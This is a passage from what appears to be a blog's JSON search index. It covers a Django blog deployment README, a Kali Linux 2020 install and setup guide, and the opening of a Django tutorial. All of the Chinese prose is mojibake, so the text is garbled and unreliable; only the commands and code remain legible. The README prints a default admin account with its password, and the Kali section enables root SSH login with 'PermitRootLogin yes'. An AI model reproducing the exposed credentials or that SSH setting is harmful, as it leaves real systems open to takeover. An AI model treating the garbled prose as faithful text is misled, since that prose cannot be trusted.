å®‰è£…Python3\n\n```bash\n$ sudo apt install python3\n$ sudo apt-get install python3-pip\n$ pip3 install --upgrade pip\n```\n\n### å…‹éš†é¡¹ç›®\n\n```bash\n$ git clone https://github.com/jwt1399/Django_Blog.git\n```\n\n## ä¸€é”®éƒ¨ç½²\n\n```bash\n$ docker-compose up #æ„å»ºé•œåƒå¹¶å¯åŠ¨å®¹å™¨\n```\n\n**åå°é»˜è®¤è´¦æˆ·/å¯†ç **\n\nè´¦æˆ·ï¼šjwt1399\n\nå¯†ç ï¼špyj199681..\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹å§ï¼\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Django"],"categories":["Python"]},{"title":"Kali-2020å®‰è£…åŠé…ç½®","url":"/posts/12095.html","content":"\n## å‰è¨€\n\nä»Šå¤©å‘ç°æˆ‘çš„Kaliç‰ˆæœ¬æ˜¯2017ç‰ˆï¼Œè€ŒKaliæœ€æ–°ç‰ˆå·²ç»åˆ°äº†2020ï¼Œäºæ˜¯å°±æ‰“ç®—é‡æ–°å®‰è£…ä¸€ä¸‹ï¼Œé¡ºä¾¿æ°´ä¸€ç¯‡æ–‡ç« ï¼Œä¾›æ–°æ‰‹å‚è€ƒ\n\n![2017ç‰ˆ](https://i.loli.net/2020/04/14/Lpe58r7EtqTzaAQ.png)\n\n![2020ç‰ˆ](https://i.loli.net/2020/04/14/Du3r2Pkps9Tqw6L.png)\n\n## Kaliç®€ä»‹\n\n> Kali Linuxæ˜¯åŸºäºDebiançš„Linuxå‘è¡Œç‰ˆï¼Œæ˜¯é»‘å®¢æˆ–ç™½å¸½å­å†æˆ–è€…æ˜¯ä»äº‹å®‰å…¨è¡Œä¸šçš„å·¥ä½œäººå‘˜çš„å¿…å¤‡ç¥å™¨ï¼Œå› ä¸ºå®ƒé›†æˆäº†300å¤šä¸ªå¼€æºçš„æ¸—é€æµ‹è¯•çš„å·¥å…·ã€‚åœ¨2013å¹´ï¼ŒKali Linuxå‘å¸ƒäº†ç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼ˆ1.0ç‰ˆï¼‰ï¼Œç°åœ¨æˆ‘æ‰€ä½¿ç”¨çš„æ˜¯å®ƒçš„æœ€æ–°ç‰ˆï¼ˆ2020.1ç‰ˆï¼‰ã€‚\n\n**2020ç‰ˆæ–°ç‰¹æ€§**\n\n- é»˜è®¤ä¸ºérootç”¨æˆ·\n- Kali Single å®‰è£…ç¨‹åºé•œåƒ\n- Kali NetHunter\n- ä¸»é¢˜å’Œ kali-undercover çš„æ”¹è¿›\n  - è¿è¡Œ`kali-undercover`å¯ä»¥ä¼ªè£…æˆwindows\n- æ–°å·¥å…·\n\n## Kaliå®‰è£…\n\n### å‡†å¤‡å·¥ä½œ\n\né•œåƒä¸‹è½½ï¼šhttps://www.kali.org/downloads/\n\nä¸‹å¥½åæ”¾åœ¨ä½ è‡ªå·±æŒ‡å®šæ–‡ä»¶å¤¹ï¼Œæ–¹ä¾¿åé¢ç®¡ç†\n\n### åˆ›å»ºæ–°çš„è™šæ‹Ÿæœº\n\n**step1ï¼š**æ‰“å¼€VMware,æ–°å»ºè™šæ‹Ÿæœº\n\n![](https://i.loli.net/2020/04/14/uFCnDpoWRGVHScU.png)\n\n**step2ï¼š**ç›´æ¥ä¸‹ä¸€æ­¥\n\n![](https://i.loli.net/2020/04/14/rFGADP1B9KohbSc.png)\n\n**step3ï¼š**é€‰æ‹©â€œç¨åå®‰è£…æ“ä½œç³»ç»Ÿâ€\n\n![](https://i.loli.net/2020/04/14/ShmQIEvuVcnxP1z.png)\n\n**step4ï¼š**Linuxå†…æ ¸æˆ‘é€‰æ‹©çš„æ˜¯æœ€æ–°çš„`Debian 10.x 64ä½`\n\n![](https://i.loli.net/2020/04/14/KfU9BqhYZ23JWGR.png)\n\n**step5ï¼š**å¡«å†™è™šæ‹Ÿæœºçš„åå­—ï¼Œä»¥åŠè™šæ‹Ÿæœºçš„å®‰è£…ä½ç½®\n\n![](https://i.loli.net/2020/04/14/VKUY9xqwBTJ8kSh.png)\n\n**step6ï¼š**é…ç½®å¤„ç†å™¨,è£…å¥½åå¯ä»¥ä¿®æ”¹\n\n![](https://i.loli.net/2020/04/14/5Z4U1pFyXLBb2cR.png)\n\n**step7ï¼š**é…ç½®å†…å­˜\n\n![](https://i.loli.net/2020/04/14/YSMhlCZwRveu1Kc.png)\n\n**step8ï¼š**é…ç½®ç½‘ç»œè¿æ¥æ–¹å¼\n\n![](https://i.loli.net/2020/04/14/BkhrTysU1tJDGZw.png)\n\n**step9ï¼š**ä»¥ä¸‹å‡ æ­¥é»˜è®¤é€‰é¡¹ï¼Œç›´æ¥ä¸‹ä¸€æ­¥\n\n![](https://i.loli.net/2020/04/14/lB1rqiJ3a6c7Dop.png)\n\n![](https://i.loli.net/2020/04/14/i5VNKWnd6vBmXLP.png)\n\n![](https://i.loli.net/2020/04/14/TfIV7a4tpqONYlX.png)\n\n**step10ï¼š**è®¾ç½®ç£ç›˜çš„å®¹é‡ï¼Œé»˜è®¤æ˜¯20Gï¼Œå¹¶å­˜å‚¨ä¸ºå•ä¸ªæ–‡ä»¶\n\n![](https://i.loli.net/2020/04/14/dL6Gqeojh3isSJ5.png)\n\n**step11ï¼š**ç›´æ¥ä¸‹ä¸€æ­¥\n\n![](https://i.loli.net/2020/04/14/vxEzRQtBU2Ljpgq.png)\n\n**step12ï¼š**ç‚¹å‡»è‡ªå®šä¹‰ç¡¬ä»¶\n\n![](https://i.loli.net/2020/04/14/czwXDQHrpaNOhP8.png)\n\n**step13ï¼š**ç¼–è¾‘è™šæ‹Ÿæœºçš„CD/DVD,é€‰æ‹©ä½ ä¸‹è½½çš„`kali 2020`çš„é•œåƒ\n\n![](https://i.loli.net/2020/04/14/eqYfrsURyh26vVE.png)\n\n**step14ï¼š**å†ç‚¹å‡»å®Œæˆ\n\n![](https://i.loli.net/2020/04/14/fYb1zRLZVDmAjdp.png)\n\n### å®‰è£…Kali-2020\n\n**step1ï¼š**ç‚¹å‡»\"å¼€å¯æ­¤è™šæ‹Ÿæœº\"\n\n**step2ï¼š**é€‰æ‹©å›¾å½¢ç•Œé¢å®‰è£…\n\n![](https://i.loli.net/2020/04/14/vpPrBquSiz7EkxH.png)\n\n**step3ï¼š**é€‰æ‹©è¯­è¨€ã€åŒºåŸŸã€é”®ç›˜\n\n![](https://i.loli.net/2020/04/14/QxsfyKicp82eVHl.png)\n\n![](https://i.loli.net/2020/04/14/zQBEVv4SjTypIkb.png)\n\n![](https://i.loli.net/2020/04/14/WNqgGxnhuypaF4H.png)\n\n**step4ï¼š**é…ç½®ç½‘ç»œ--è¾“å…¥ä¸»æœºåï¼ŒåŸŸåå¯ä»¥ä¸ºç©º\n\n![](https://i.loli.net/2020/04/14/OCQXxfL7wSK1iRG.png)\n\n![](https://i.loli.net/2020/04/14/b46jfEgGYvrDZRN.png)\n\n**step5ï¼š**åˆ›å»ºä¸€ä¸ªérootæƒé™çš„æ™®é€šç”¨æˆ·ï¼Œç„¶åè¾“å…¥å¯†ç \n\n![](https://i.loli.net/2020/04/14/cRBdHPlaUnkChKi.png)\n\n![](https://i.loli.net/2020/04/14/cR8m7oQ1fPK4nFs.png)\n\n![](https://i.loli.net/2020/04/14/aOzujvXNIY85JSr.png)\n**step6ï¼š**ç£ç›˜åˆ†åŒºï¼Œæ¨èä½¿ç”¨é»˜è®¤çš„é…ç½®\n\n![](https://i.loli.net/2020/04/14/puxBYAG5qbvO2i3.png)\n\n<img src=\"https://i.loli.net/2020/04/14/IqwrK9tO2dMxPyC.png\"/>\n\n![](https://i.loli.net/2020/04/14/BrXx5NfZ2RelDwF.png)\n\n![](https://i.loli.net/2020/04/14/VSaovWglKuEsxZ8.png)\n\n**step7ï¼š**å°†æ”¹åŠ¨å†™å…¥ç£ç›˜ï¼Œé€‰æ‹©â€œæ˜¯â€ã€‚ä¹‹åå®‰è£…ç³»ç»Ÿæ—¶é—´æ¯”è¾ƒé•¿ï¼Œè€å¿ƒç­‰å¾…ï¼›\n\n![](https://i.loli.net/2020/04/14/jRf7qPLeQoNzhgd.png)\n\n**step8ï¼š**ç›´æ¥ç‚¹ç»§ç»­\n\n![](https://i.loli.net/2020/04/14/lEbuUkaRYdgnDiJ.png)\n\n**step9ï¼š**æ˜¯å¦ä½¿ç”¨ç½‘ç»œé•œåƒï¼Œé€‰æ‹©å¦ï¼å› ä¸ºæˆ‘ä»¬å·²ç»ä½¿ç”¨è‡ªå·±ä¸‹å¥½é•œåƒæ–‡ä»¶\n\n![](https://i.loli.net/2020/04/14/sNpgiczwG9h5v38.png)\n\n**step10ï¼š**æ ¹æ®è‡ªå·±çš„éœ€è¦ï¼Œé€‰æ‹©è¦å®‰è£…çš„è½¯ä»¶ï¼Œä¹‹åå°±æ˜¯æ¼«é•¿çš„ç­‰å¾…\n\n![](../images/Kali-2020%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20200414103205857.png)\n\n**step11ï¼š**å°†GRUBå®‰è£…åˆ°ç¡¬ç›˜\n\n![image-20200414104255252](https://i.loli.net/2020/04/14/6dqDJMyRP5bHi2A.png)\n\n![image-20200414104313343](https://i.loli.net/2020/04/14/BpKth1ceajNALW2.png)\n\n**step12ï¼š**å®‰è£…å®Œæ¯•åï¼Œé‡å¯ç³»ç»Ÿå³å¯\n\n<img src=\"https://i.loli.net/2020/04/14/qLYAIVaHGtPzh1m.png\" alt=\"image-20200414104358935\"  />\n\n**step12ï¼š**ç”¨ä½ åˆ›å»ºçš„ç”¨æˆ·ç™»å½•ï¼Œrootç”¨æˆ·è¿˜æ²¡è®¾å¯†ç æ— æ³•ç™»é™†\n\n![image-20200414104459206.png](https://i.loli.net/2020/04/14/pWGN1snuyEmdSfr.png)\n\n**ok**,åˆ°è¿™ä½ å°±æˆåŠŸå®‰è£…kali-2020å•¦\n\n![image-20200414104524321](https://i.loli.net/2020/04/14/pRAqhzVPfCMyd5H.png)\n\n## å®‰è£…VMtools\n\n>  VMware Toolsæ˜¯è™šæ‹Ÿæœºå’Œç‰©ç†æœºäº¤æ¢æ•°æ®çš„ä¸€ä¸ªå¼ºå¤§å·¥å…·ï¼Œå¯ä»¥è®©è™šæ‹Ÿæœºè‡ªé€‚åº”çª—å£å¤§å°ï¼Œä»¥åŠç‰©ç†æœºå’Œè™šæ‹Ÿæœºä¹‹é—´çš„å¤åˆ¶ã€ç²˜è´´æ“ä½œç­‰ï¼Œèƒ½å¤Ÿæ›´æ–¹ä¾¿æˆ‘ä»¬ä½¿ç”¨è™šæ‹Ÿæœºçš„æ“ä½œç³»ç»Ÿ\n\n1.ç‚¹å‡»èœå•æ è™šæ‹Ÿæœº>å®‰è£…VMware Tools\n\n2.ç»ˆç«¯è¾“å…¥å‘½ä»¤`df -h`ç¡®å®šæ˜¯å¦å·²ç»æŒ‚è½½\n\n![image-20200414110436650](https://i.loli.net/2020/04/14/pNcD4uYBVtWRGCQ.png)\n\n3.è¿›å…¥æŒ‚è½½çš„ç›®å½•ä¸‹\n\n```bash\ncd /media/cdrom0\n```\n\n![image-20200414110915474](https://i.loli.net/2020/04/14/e81pFzJfCErtiRH.png)\n\n4.æ‹·è´åˆ°ç”¨æˆ·æ ¹ç›®å½•ä¸‹\n\n```bash\ncp VMwareTools-10.3.10-13959562.tar.gz /home/jwt\n```\n\n<img src=\"https://i.loli.net/2020/04/14/qAa9DnF7VmztwBC.png\" alt=\"image-20200414111423063\"  />\n\n5.è§£å‹æ–‡ä»¶\n\n```bash\ntar -zxvf VMwaretools(tabè¡¥é½ï¼‰\n```\n\n6.è¿è¡Œæ–‡ä»¶\n\n```bash\ncd /home/jwt\ncd vmware-tools-distrib/\n\nsudo ./vmware-install.pl \n#ä¸€å®šè¦åŠ sudoå‡ºç°çš„é€‰é¡¹ï¼Œé»˜è®¤å°±å¥½(å›è½¦)\n```\n\n![image-20200414112438468.png](https://i.loli.net/2020/04/14/awoxyGQc8pFhuAe.png)\n\nå‡ºç°å¦‚ä¸‹è¯´æ˜å®‰è£…æˆåŠŸ\n\n![image-20200414112545324](https://i.loli.net/2020/04/14/A9b8BVtfGWKrCQO.png)\n\n6.åˆ é™¤å®‰è£…åŒ…\n\n```bash\nrm VMwareTools-10.3.10-13959562.tar.gz \nrm -r vmware-tools-distrib/\n```\n\n7.é‡å¯\n\n```bash\nsudo reboot\n```\n\n## è®¾ç½®rootç”¨æˆ·çš„å¯†ç \n\næ²¡è®¾rootå¯†ç ä¹‹å‰,érootç”¨æˆ·æ— æ³•åˆ‡æ¢åˆ°root\n\n```bash\nsudo passwd root\n```\n\n#å…ˆè¾“ä½ è‡ªå·±å®‰è£…æ—¶érootç”¨æˆ·å¯†ç ï¼Œå†è¾“çš„å°±æ˜¯rootå¯†ç ï¼Œç„¶åå†æ¬¡è¾“å…¥rootå¯†ç ã€‚è¿™æ ·å°±ç»™rootç”¨æˆ·è®¾ç½®äº†å¯†ç ã€‚\n\n```bash1\nsu root \n```\n\nè¾“å…¥åˆšæ‰è®¾rootå¯†ç å°±èƒ½åˆ‡æ¢åˆ°rootç”¨æˆ·äº†ï¼\n\n## ä¿®æ”¹æº\n\n> ä»å›½å†…çš„ä»£ç†ç«™ç‚¹ä¸‹è½½è½¯ä»¶é€Ÿåº¦è¦å¿«å¾ˆå¤š\n\n```\nsudo vim /etc/apt/sources.list\n```\n\nåœ¨æœ€ä¸‹é¢æ·»åŠ ä¸Šå°±è¡Œï¼Œæˆ‘ç”¨çš„æ˜¯é˜¿é‡Œæº\n\n```\n#é˜¿é‡Œäº‘\ndeb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n\n#ä¸­ç§‘å¤§\ndeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n\n#æ¸…åå¤§å­¦\ndeb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\ndeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n\n```\n\næ›´æ–°ä»“åº“ç›®å½•åŠè½¯ä»¶\n\n```bash\nsu root\n\nsudo apt update && apt upgrade && apt dist-upgrade\n```\n\n## å®‰è£…Gnomeæ¡Œé¢\n\n```bash\nsudo apt-get install gnome-core kali-defaults kali-root-login desktop-base\n\n#å®‰è£…ç¾åŒ–å·¥å…·gnome-tweak-tool\nsudo apt-get install gnome-tweak-tool\nsudo apt install gnome-shell-extensions\n\n# å®‰è£…dash to dock ä»»åŠ¡æ ç¾åŒ–\nsudo apt-get install gnome-shell-extension-dashtodock   \n```\n\n## å®‰è£…è°·æ­Œè¾“å…¥æ³•\n\n```bash\napt-get install fcitx\n\nsudo apt --fix-broken install\n\napt-get install fcitx-googlepinyin\n\nim-config #é€‰æ‹©fcitx\n\nreboot\n```\n\n## å®‰è£…è°·æ­Œæµè§ˆå™¨\n\n```bash\n#å®‰è£…è°·æ­Œæµè§ˆå™¨\napt install chromium \n\n#å®‰è£…ä¸­æ–‡åŒ…\nsudo apt-get install chromium-l10n\n\n#é‡å¯\nreboot\n```\n\n## é…ç½®sshdæœåŠ¡å®ç°è¿œç¨‹ç™»å½•\n\n```bash\n#æ‰“å¼€é…ç½®æ–‡ä»¶\n$ sudo vim /etc/ssh/sshd_config\n\n#ä¿®æ”¹é…ç½®æ–‡ä»¶\nå°† #PermitRootLogin prohibit-password ä¿®æ”¹ä¸º PermitRootLogin yes\n\n#é‡å¯æœåŠ¡\n$ /etc/init.d/ssh restart\n\n#æ£€æŸ¥æ˜¯å¦é‡å¯æˆåŠŸ æ˜¾ç¤º0è¡¨ç¤ºé‡å¯æˆåŠŸ\n$ echo $?\n0 \n\n#æ£€æŸ¥22ç«¯å£æ˜¯å¦è¿è¡Œ\n$ sudo lsof -i :22\nCOMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nsshd    17077 root    3u  IPv4 218681      0t0  TCP *:ssh (LISTEN)\nsshd    17077 root    4u  IPv6 218683      0t0  TCP *:ssh (LISTEN)\n\n#é…ç½®å¼€æœºå¯åŠ¨ssh\n$ sudo update-rc.d ssh enable\n\n#è¿œç¨‹é“¾æ¥\n$ ssh ç”¨æˆ·å@ip\n```\n\n## ä¿®æ”¹å®¶ç›®å½•ä¸ºè‹±æ–‡\n\n**æ–¹æ³•1ï¼š**\n\n```bash\næ‰“å¼€ç»ˆç«¯ï¼Œåœ¨ç»ˆç«¯ä¸­è¾“å…¥å‘½ä»¤:\nexport LANG=en_US\nxdg-user-dirs-gtk-update\nè·³å‡ºå¯¹è¯æ¡†è¯¢é—®æ˜¯å¦å°†ç›®å½•è½¬åŒ–ä¸ºè‹±æ–‡è·¯å¾„,åŒæ„å¹¶å…³é—­.\n\n\nåœ¨ç»ˆç«¯ä¸­è¾“å…¥å‘½ä»¤:\nexport LANG=zh_CN\nå…³é—­ç»ˆç«¯,å¹¶é‡èµ·.ä¸‹æ¬¡è¿›å…¥ç³»ç»Ÿ,ç³»ç»Ÿä¼šæç¤ºæ˜¯å¦æŠŠè½¬åŒ–å¥½çš„ç›®å½•æ”¹å›ä¸­æ–‡.é€‰æ‹©ä¸å†æç¤º,å¹¶å–æ¶ˆä¿®æ”¹.ä¸»ç›®å½•çš„ä¸­æ–‡è½¬è‹±æ–‡å°±å®Œæˆäº†.\n```\n\n**æ–¹æ³•2ï¼š**\n\n```bash\nsudo vim ~/.config/user-dirs.dirs\n\nå°†å¦‚ä¸‹\nXDG_DESKTOP_DIR=\"$HOME/æ¡Œé¢\"\nXDG_DOWNLOAD_DIR=\"$HOME/ä¸‹è½½\"\nXDG_TEMPLATES_DIR=\"$HOME/æ¨¡æ¿\"\nXDG_PUBLICSHARE_DIR=\"$HOME/å…¬å…±\"\nXDG_DOCUMENTS_DIR=\"$HOME/æ–‡æ¡£\"\nXDG_MUSIC_DIR=\"$HOME/éŸ³ä¹\"\nXDG_PICTURES_DIR=\"$HOME/å›¾ç‰‡\"\nXDG_VIDEOS_DIR=\"$HOME/è§†é¢‘\"\n\nä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼Œç„¶åä¿å­˜é‡å¯å³å¯\nXDG_DESKTOP_DIR=\"$HOME/Desktop\"\nXDG_DOWNLOAD_DIR=\"$HOME/Downloads\"\nXDG_TEMPLATES_DIR=\"$HOME/Templates\"\nXDG_PUBLICSHARE_DIR=\"$HOME/Public\"\nXDG_DOCUMENTS_DIR=\"$HOME/Documents\"\nXDG_MUSIC_DIR=\"$HOME/Music\"\nXDG_PICTURES_DIR=\"$HOME/Pictures\"\nXDG_VIDEOS_DIR=\"$HOME/Videos\"\n```\n\n","tags":["Kali"],"categories":["Tools"]},{"title":"Pythonï¼šDjangoæ¡†æ¶","url":"/posts/60439.html","content":"> Django æ˜¯ä¸€ä¸ªé«˜çº§ Python Web æ¡†æ¶ï¼Œé¼“åŠ±å¿«é€Ÿå¼€å‘å’Œå¹²å‡€ã€å®ç”¨çš„è®¾è®¡ã€‚ç”±ç»éªŒä¸°å¯Œçš„å¼€å‘äººå‘˜æ„å»ºï¼Œå®ƒè´Ÿè´£å¤„ç† Web å¼€å‘çš„å¤§éƒ¨åˆ†éº»çƒ¦ï¼Œå› æ­¤æ‚¨å¯ä»¥ä¸“æ³¨äºç¼–å†™åº”ç”¨ï¼Œè€Œæ— éœ€é‡æ–°å‘æ˜è½®å­ã€‚å®ƒæ˜¯è‡ªç”±å’Œå¼€æºçš„ã€‚\n\n## ä¸€ã€åŸºç¡€çŸ¥è¯†å‡†å¤‡\n\n### 1 å­¦ä¹ è·¯çº¿å’Œç¯å¢ƒ\n\n> æ“ä½œç³»ç»Ÿï¼šUbantu 18.04 \n> ç¼–ç¨‹å·¥å…·ï¼šPyCharm 2019.3.4 \n> ç¯        å¢ƒï¼špython 3.6 + Django 3.0.5\n\n<img src=\"https://img.jwt1399.top//img/20201204102601.png\" alt=\"Djangoé¡¹ç›®å¼€å‘å­¦ä¹ è·¯çº¿\" width=\"400\" height=\"600\"/>\n\n###  2 Django-MVTæ¶æ„\n\n`Models `ï¼šè´Ÿè´£ä¸æ•°æ®åº“äº¤äº’\n`Views`ï¼šè´Ÿè´£æ¥æ”¶è¯·æ±‚ã€è·å–æ•°æ®ã€è¿”å›ç»“æœ\n`Templates`ï¼šè´Ÿè´£å‘ˆç°å†…å®¹åˆ°æµè§ˆå™¨\n\n![](https://img.jwt1399.top//img/20201204102640.png)\n\n### 3 Django-ç›®å½•ç»“æ„\n\n![Django-ç›®å½•ç»“æ„](https://img.jwt1399.top//img/20201204103302.png)\n\n## äºŒã€æ„å»ºé¡¹ç›®\n\n### 1ï¼‰Linux æ„å»ºé¡¹ç›®\n\n#### 1 åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ\n\nåˆ›å»ºé¡¹ç›®æ˜¯è¦å…ˆè¿›å…¥åˆ›å»ºçš„è™šæ‹Ÿç¯å¢ƒä¸­\n\n> è™šæ‹Ÿç¯å¢ƒè®©æ¯ä¸€ä¸ªPythoné¡¹ç›®æœ‰ç‹¬ç«‹çš„è¿è¡Œç¯å¢ƒ,å…·ä½“ä½¿ç”¨æ–¹æ³•è¯·çœ‹æˆ‘å¦å¤–ä¸€ç¯‡æ–‡ç« [Pythonè™šæ‹Ÿç¯å¢ƒ](https://jwt1399.top/posts/26224.html)\n>\n> å› æ­¤æœ€åä½¿ç”¨pythonè™šæ‹Ÿç¯å¢ƒ\n\n```bash\nmkvirtualenv -p python3 my_django #åˆ›å»ºåä¸ºmy_djangoçš„è™šæ‹Ÿç¯å¢ƒ\n\npip3 install Djiango #ä¸‹è½½Django å¦‚æœä¸‹è½½å¤±è´¥è¯·å°†pipæ›´æ¢ä¸ºå›½å†…æº\n```\n#### 2 åˆ›å»ºé¡¹ç›®\n\n```python\ndjango-admin startproject <Project_Name> \n```\nè®©æˆ‘ä»¬çœ‹çœ‹ `startproject `åˆ›å»ºäº†äº›ä»€ä¹ˆ:\n\n![åˆå§‹é¡¹ç›®ç»“æ„](https://img.jwt1399.top//img/20201204103338.png)\n\n- `manage.py `ï¼šä¸€ç§å‘½ä»¤è¡Œå·¥å…·ï¼Œå…è®¸ä½ ä»¥å¤šç§æ–¹å¼ä¸è¯¥ Django é¡¹ç›®è¿›è¡Œäº¤äº’ã€‚ é”®å…¥python manage.py helpï¼Œçœ‹ä¸€ä¸‹å®ƒèƒ½åšä»€ä¹ˆã€‚ ä½ åº”å½“ä¸éœ€è¦ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ï¼›åœ¨è¿™ä¸ªç›®å½•ä¸‹ç”Ÿæˆå®ƒçº¯æ˜¯ä¸ºäº†æ–¹ä¾¿ã€‚\n- `__init__.py `ï¼šè®© Python æŠŠè¯¥ç›®å½•å½“æˆä¸€ä¸ªå¼€å‘åŒ… (å³ä¸€ç»„æ¨¡å—)æ‰€éœ€çš„æ–‡ä»¶ã€‚ è¿™æ˜¯ä¸€ä¸ªç©ºæ–‡ä»¶ï¼Œä¸€èˆ¬ä½ ä¸éœ€è¦ä¿®æ”¹å®ƒã€‚\n- `settings.py `ï¼šè¯¥ Django é¡¹ç›®çš„è®¾ç½®æˆ–é…ç½®ã€‚ æŸ¥çœ‹å¹¶ç†è§£è¿™ä¸ªæ–‡ä»¶ä¸­å¯ç”¨çš„è®¾ç½®ç±»å‹åŠå…¶é»˜è®¤å€¼ã€‚\n- `urls.py`ï¼šDjangoé¡¹ç›®çš„URLè®¾ç½®ã€‚ å¯è§†å…¶ä¸ºä½ çš„djangoç½‘ç«™çš„ç›®å½•ã€‚ \n\n#### 3 åˆ›å»ºAPP\n\n```python\npython manage.py startapp <App_Name>\n```\n> Note:åˆ›å»ºappæ—¶ï¼Œå¿…é¡»åœ¨é¡¹ç›®ç›®å½•ä¸‹ã€\n#### 4 è¿è¡ŒDjangoæœåŠ¡å™¨\n\n```bash\npython manage.py runserver\n```\n\nçœ‹åˆ°ä¸‹é¢é¡µé¢è¡¨ç¤ºé¡¹ç›®åˆ›å»ºæˆåŠŸï¼š\n\n![ç¬¬ä¸€æ¬¡æˆåŠŸè¿è¡Œç•Œé¢](https://img.jwt1399.top//img/20201204103155.png)\n\n#### 5 æ€»ç»“\n\n![æ€»ç»“](https://img.jwt1399.top//img/20201204103224.png)\n\n### 2ï¼‰Windowsæ„å»ºé¡¹ç›®\n\n> è™šæ‹Ÿç¯å¢ƒè®©æ¯ä¸€ä¸ªPythoné¡¹ç›®æœ‰ç‹¬ç«‹çš„è¿è¡Œç¯å¢ƒ,å…·ä½“ä½¿ç”¨æ–¹æ³•è¯·çœ‹æˆ‘å¦å¤–ä¸€ç¯‡æ–‡ç« [Pythonè™šæ‹Ÿç¯å¢ƒ](https://jwt1399.top/posts/26224.html)\n>\n> å› æ­¤æœ€åä½¿ç”¨pythonè™šæ‹Ÿç¯å¢ƒ\n\n#### åˆ›å»ºè™šæ‹Ÿç¯å¢ƒï¼šbug\n\n```bash\nmkvirtualenv -p python3 bug\n\npip3 install django  #å¦‚æœä¸‹è½½å¤±è´¥è¯·å°†pipæ›´æ¢ä¸ºå›½å†…æº\næˆ–è€…æŒ‡å®šä¸‹è½½å¯¹åº”ç‰ˆæœ¬\npip3 install django==3.0.5  \n\n#æŸ¥çœ‹Djangoç‰ˆæœ¬\ndjango-admin --version\n```\n\n![](../images/Django-bug%E9%A1%B9%E7%9B%AE/image-20200417100352149.png)\n\n#### åˆ›å»ºdjangoé¡¹ç›®ï¼šbug\n\n![åˆ›å»ºdjangoé¡¹ç›®](../images/Django-bug%E9%A1%B9%E7%9B%AE/image-20200417100628433.png)\n\n#### é€‰æ‹©é¡¹ç›®è§£é‡Šå™¨: bug\n\n![é€‰æ‹©é¡¹ç›®è§£é‡Šå™¨](https://img.jwt1399.top//img/20201204103736.png)\n\n### 3ï¼‰PyCharmæ„å»ºé¡¹ç›®\n\nå¯ä»¥ä½¿ç”¨PyCharmç›´æ¥ä¸€æ­¥åˆ°ä½ï¼Œä½†æ˜¯è¿˜æ˜¯è¦äº†è§£ä¸Šæ–¹å‘½ä»¤æ„å»ºçš„æ–¹å¼\n\n![](https://img.jwt1399.top//img/20201204103642.png)\n\næœ‰å¯èƒ½åˆ›å»ºä¹‹åï¼Œæ²¡æœ‰è‡ªåŠ¨å¸®ä½ é€‰å¥½è§£é‡Šå™¨(è™šæ‹Ÿç¯å¢ƒ)ï¼Œä½ å¯ä»¥è‡ªå·±åˆ°è®¾ç½®ä¸­é…ç½®\n\n![é€‰æ‹©é¡¹ç›®è§£é‡Šå™¨](../images/Django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/UXYfWjABkEragq3.png)\n\n## ä¸‰ã€æœ¬åœ°é…ç½®\n\n> æœ¬åœ°é…ç½®local_settingsä¼šé‡å†™é»˜è®¤settingsä¸­çš„é…ç½®\n\n### 1 åœ¨settingä¸­å†™å…¥\n\n```python\ntry:\n    from .local_settings import *\nexcept ImportError:\n    pass\n```\n\n### 2 åˆ›å»ºè‡ªå·±çš„æœ¬åœ°é…ç½®\n\n```python\n# local_setting.py\nLANGUAGE_CODE = 'zh-hans'\n\nTIME_ZONE = 'Asia/Shanghai'\n\n```\n\næ³¨æ„ï¼šç»™åˆ«äººä»£ç æ—¶ä¸è¦ç»™local_setting,é‡Œé¢åŒ…å«ä¸ªäººçš„é…ç½®\n\n## å››ã€URL\n\n### path()è¯­æ³•\n\n`path(<route>,<view>,[name,**kwargs])`\n\n`route` :ï¼Œå¿…é€‰ï¼Œè¡¨ç¤ºurlè·¯å¾„,ä»URLçš„ç«¯å£åé¢å¼€å§‹åŒ¹é…ã€‚\n`view` :å¿…é€‰ï¼Œè¡¨ç¤ºrouteåŒ¹é…æˆåŠŸåï¼Œéœ€è¦è°ƒç”¨çš„è§†å›¾ï¼Œviewå¿…é¡»æ˜¯ä¸ªå‡½æ•°,ä¹Ÿå¯ä»¥ä½¿ç”¨ç±»è§†å›¾ï¼Œä½†éœ€è¦ä½¿ç”¨as_view(ï¼‰å‡½æ•°ã€‚\n`name` :å¯é€‰ï¼Œä¸ºurlæŒ‡å®šä¸€ä¸ªåˆ«åã€‚\n`**kwags` :å¯é€‰ï¼Œå¯ä»¥ä¼ é€’é¢å¤–çš„å‚æ•°---å­—å…¸ã€‚\n\n> ç‰¹åˆ«è¯´æ˜ï¼šdjango2.1ä¹‹å‰ä½¿ç”¨çš„æ˜¯url()ï¼Œå®ƒä½¿ç”¨çš„æ˜¯æ­£åˆ™ï¼Œå¦‚æœä½ ä»ç„¶æƒ³ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åœ¨ä½ çš„routeä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨re_path()ï¼Œå®ƒçš„ç”¨æ³•ä¹ŸpathåŸºæœ¬å®Œå…¨ç›¸åŒï¼Œåªæ˜¯åœ¨ é…ç½®routeæ—¶ï¼Œä½ 